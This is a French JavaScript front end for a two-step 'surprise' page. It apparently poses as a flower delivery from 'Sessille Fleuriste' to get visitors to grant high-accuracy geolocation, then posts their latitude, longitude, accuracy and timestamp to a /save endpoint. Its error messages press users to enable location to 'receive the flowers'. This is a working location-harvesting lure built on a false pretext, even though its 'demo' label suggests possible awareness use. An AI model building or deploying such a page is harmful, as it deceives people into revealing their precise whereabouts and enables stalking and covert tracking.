/**
 * ============================================================
 *  GEO-DEMO — Frontend JavaScript
 *  Gestion du processus en 2 étapes ("Surprise" puis "Géoloc")
 * ============================================================
 */

// ─────────────────────────────────────────────
//  ÉTAPE 1 : Le clic sur "Voir la surprise"
//  ↳ Enregistre une consultation de page dans Firebase
// ─────────────────────────────────────────────
async function handleSurprise() {
  const btn = document.getElementById("btn-surprise");
  btn.disabled = true;
  btn.innerHTML = `<span style="font-size:1.1rem">⏳</span><span> Chargement magique...</span>`;

  try {
    // On envoie un log "Vue" au serveur sans les coordonnées
    await fetch("/save", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "view" })
    });
  } catch (err) {
    console.error("Erreur de l'enregistrement de vue", err);
  }

  // Animation fluide pour passer à l'étape de Géolocalisation (Étape 2)
  setTimeout(() => {
    document.getElementById("step-1").style.display = "none";
    const step2 = document.getElementById("step-2");
    step2.style.display = "block";
    step2.classList.add("fade-in-up"); // Animation CSS
  }, 400); // Petit délai pour laisser respirer l'animation
}

// ─────────────────────────────────────────────
//  Références DOM (Étape 2)
// ─────────────────────────────────────────────
const statusArea = document.getElementById("status-area");
let originalBtnHTML = "";

// Vérification de la disponibilité de l'API
if (!navigator.geolocation) {
  showStatus("error", "❌", "Votre navigateur (ou appareil) ne supporte pas la géolocalisation.");
  const btn = document.getElementById("btn-continue");
  if (btn) btn.disabled = true;
}

// ─────────────────────────────────────────────
//  ÉTAPE 2 : Demande de géolocalisation
// ─────────────────────────────────────────────
function handleContinue() {
  const btnContinue = document.getElementById("btn-continue");
  // Sauvegarder l'état du bouton pour la fonction enableRetry
  if (btnContinue && !originalBtnHTML) {
    originalBtnHTML = btnContinue.outerHTML;
  }
  
  if (btnContinue) btnContinue.disabled = true;

  showLoader("Recherche de la meilleure zone de livraison...");

  const geoOptions = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0,
  };

  navigator.geolocation.getCurrentPosition(
    onGeolocationSuccess,
    onGeolocationError,
    geoOptions
  );
}

// ─────────────────────────────────────────────
//  Callback : Géolocalisation réussie
// ─────────────────────────────────────────────
async function onGeolocationSuccess(position) {
  const { latitude, longitude, accuracy } = position.coords;
  const timestamp = position.timestamp;

  showLoader("Envoi en cours à Sessille Fleuriste...");

  try {
    const response = await fetch("/save", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "location", latitude, longitude, accuracy, timestamp }),
    });

    const contentType = response.headers.get("content-type") || "";
    if (!contentType.includes("application/json")) {
      throw new Error(`Le serveur ne répond pas correctement (statut ${response.status}).`);
    }

    const data = await response.json();

    if (data.success) {
      showSuccess(latitude, longitude, accuracy);
    } else {
      throw new Error(data.message || "Erreur inconnue du serveur.");
    }
  } catch (err) {
    const isNetworkError = err instanceof TypeError && err.message.includes("fetch");
    const msg = isNetworkError
      ? "Connexion réseau perdue. Réessayez."
      : err.message;
    showStatus("error", "🔌", msg);
    enableRetry();
  }
}

// ─────────────────────────────────────────────
//  Callback : Géolocalisation refusée ou erreur
// ─────────────────────────────────────────────
function onGeolocationError(error) {
  let message = "";

  switch (error.code) {
    case error.PERMISSION_DENIED:
      message = "Vous avez refusé l'accès à votre position. Autorisez la localisation dans les réglages de votre appareil pour recevoir les fleurs.";
      break;
    case error.POSITION_UNAVAILABLE:
      message = "Position introuvable. Activez le GPS de votre appareil.";
      break;
    case error.TIMEOUT:
      message = "Le délai d'attente a été dépassé. Assurez-vous d'être à l'extérieur ou réessayez.";
      break;
    default:
      message = `Erreur inattendue : ${error.message}`;
  }

  showStatus("error", "❌", message);
  enableRetry();
}

// ─────────────────────────────────────────────
//  Utilitaires d'Affichage
// ─────────────────────────────────────────────

function showLoader(text) {
  statusArea.innerHTML = `
    <div class="spinner" style="border-top-color: #db2777;"></div>
    <p style="color: var(--clr-text-muted); font-size: 0.9rem;">${text}</p>
  `;
}

function showStatus(type, icon, message) {
  statusArea.innerHTML = `
    <div class="status-message ${type}">
      <span class="status-icon">${icon}</span>
      <span>${message}</span>
    </div>
  `;
}

function showSuccess(lat, lng, accuracy) {
  const date = new Date().toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" });
  statusArea.innerHTML = `
    <div class="status-message success" style="background: rgba(219,39,119,0.1); border-color: rgba(219,39,119,0.3); color: #f9a8d4;">
      <span class="status-icon">💐</span>
      <div style="flex:1">
        <strong style="color: #fff;">Félicitations, livraison magique déclenchée !</strong><br/>
        Sessille Fleuriste va préparer votre bouquet exclusif pour la zone définie.
      </div>
    </div>
  `;
}

function enableRetry() {
  const retryBtn = document.createElement("button");
  retryBtn.className = "btn-primary btn-pink";
  retryBtn.style.cssText = "font-size:0.9rem; padding:12px 28px; margin-top:12px;";
  retryBtn.innerHTML = "🔄 Réessayer";
  retryBtn.onclick = () => {
    statusArea.innerHTML = originalBtnHTML;
    handleContinue();
  };
  statusArea.appendChild(retryBtn);
}
